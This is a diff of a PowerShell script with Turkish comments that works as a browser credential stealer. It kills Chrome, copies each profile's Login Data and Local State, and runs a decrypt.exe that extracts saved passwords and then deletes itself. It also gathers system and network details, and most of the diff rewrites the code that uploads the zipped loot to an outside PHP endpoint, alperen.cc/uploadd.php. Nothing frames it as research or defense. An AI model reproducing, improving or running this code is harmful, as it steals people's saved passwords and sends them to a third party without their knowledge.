@@ -46,8 +46,8 @@ foreach ($profile in $profiles) {
     # Kill Chrome processes
     KillBrowserProcesses "chrome"
 
-    # Copy the necessary files (Login Data, History, etc.)
-    $filesToCopy = @("Login Data", "History", "Local State")
+    # Copy the necessary files (Login Data, etc.)
+    $filesToCopy = @("Login Data", "Local State")
     CopyBrowserFiles $profileName $profileDir $filesToCopy
 
     # If Local State exists, copy it
@@ -68,14 +68,14 @@ foreach ($profile in $profiles) {
         if (Test-Path $loginDataPath -and Test-Path $localStatePath) {
             # Run the decrypt.exe with specified parameters and capture output
             $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
-            Write-Host "Decrypt.exe output for ${profileName}: $($result)"  # Hata düzeltildi
-
+            Write-Host "Decrypt.exe output for ${profileName}: $($result)"
+    
             if (Test-Path $outputPath) {
                 Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
             } else {
                 Write-Host "$profileName - Decrypted passwords not found."
             }
-
+    
             # Delete decrypt.exe after use
             try {
                 Remove-Item $decryptExePath -Force -ErrorAction Stop
@@ -155,12 +155,6 @@ $systemInfoFile = Join-Path -Path $destDir -ChildPath "SystemInfo.txt"
 $systemInfo | Out-File -FilePath $systemInfoFile
 Write-Host "System info saved."
 
-# Collecting Installed Software
-$installedPrograms = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
-$installedProgramsFile = Join-Path -Path $destDir -ChildPath "InstalledPrograms.txt"
-$installedPrograms | Out-File -FilePath $installedProgramsFile
-Write-Host "Installed software list saved."
-
 # Collecting Network Configuration
 $networkConfig = Get-NetIPConfiguration
 $networkConfigFile = Join-Path -Path $destDir -ChildPath "NetworkConfig.txt"
@@ -176,44 +170,54 @@ if (-Not (Test-Path $zipDir)) {
 $folderPath = $destDir
 $zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"
 
-if (Test-Path $zipFilePath) {
-    Remove-Item $zipFilePath -Force
-}
+$url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si
 
-Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
-
-# Upload the ZIP file to a PHP server
-$url = "https://alperen.cc/uploadd.php"
 if (Test-Path $zipFilePath) {
     try {
+        # Multipart form-data boundary oluşturma
         $boundary = [System.Guid]::NewGuid().ToString("N")
         $contentType = "multipart/form-data; boundary=$boundary"
 
+        # Form data başlıkları
         $fileName = [System.IO.Path]::GetFileName($zipFilePath)
-        $fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
-        $encodedFile = [Convert]::ToBase64String($fileContent)
+        $header = "--$boundary`r`nContent-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`nContent-Type: application/zip`r`n`r`n"
+        $footer = "`r`n--$boundary--`r`n"
 
-        $fileUploadData = @"
---$boundary
-Content-Disposition: form-data; name="file"; filename="$fileName"
-Content-Type: application/zip
+        # Dosya içeriğini oku (binary olarak)
+        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
 
-$encodedFile
---$boundary--
-"@
+        # Body oluşturma
+        $bodyStream = New-Object System.IO.MemoryStream
+        $writer = New-Object System.IO.StreamWriter $bodyStream
+        $writer.Write($header)
+        $writer.Flush()
 
-        $httpClient = New-Object System.Net.Http.HttpClient
-        $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
-        $response = $httpClient.PostAsync($url, [System.Net.Http.StringContent]::new($fileUploadData, [System.Text.Encoding]::UTF8, $contentType)).Result
+        # Binary dosyayı ekleme
+        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
+        $writer.Flush()
 
-        if ($response.IsSuccessStatusCode) {
-            Write-Host "File uploaded successfully."
-        } else {
-            Write-Host "File upload failed. Status code: $($response.StatusCode)"
-        }
+        # Footer ekle
+        $writer.Write($footer)
+        $writer.Flush()
+
+        # Body'yi byte array olarak oku
+        $bodyStream.Position = 0
+        $bodyBytes = $bodyStream.ToArray()
+
+        # POST isteğini gönder
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType $contentType -ErrorAction Stop
+
+        # Yanıtı göster
+        Write-Output $response
+
+        # Temizlik
+        $writer.Dispose()
+        $bodyStream.Dispose()
     } catch {
-        Write-Host "Error uploading file: $_"
+        Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
     }
 } else {
-    Write-Host "ZIP file not found for upload."
+    Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
 }
+
+Write-Host "Script execution completed."
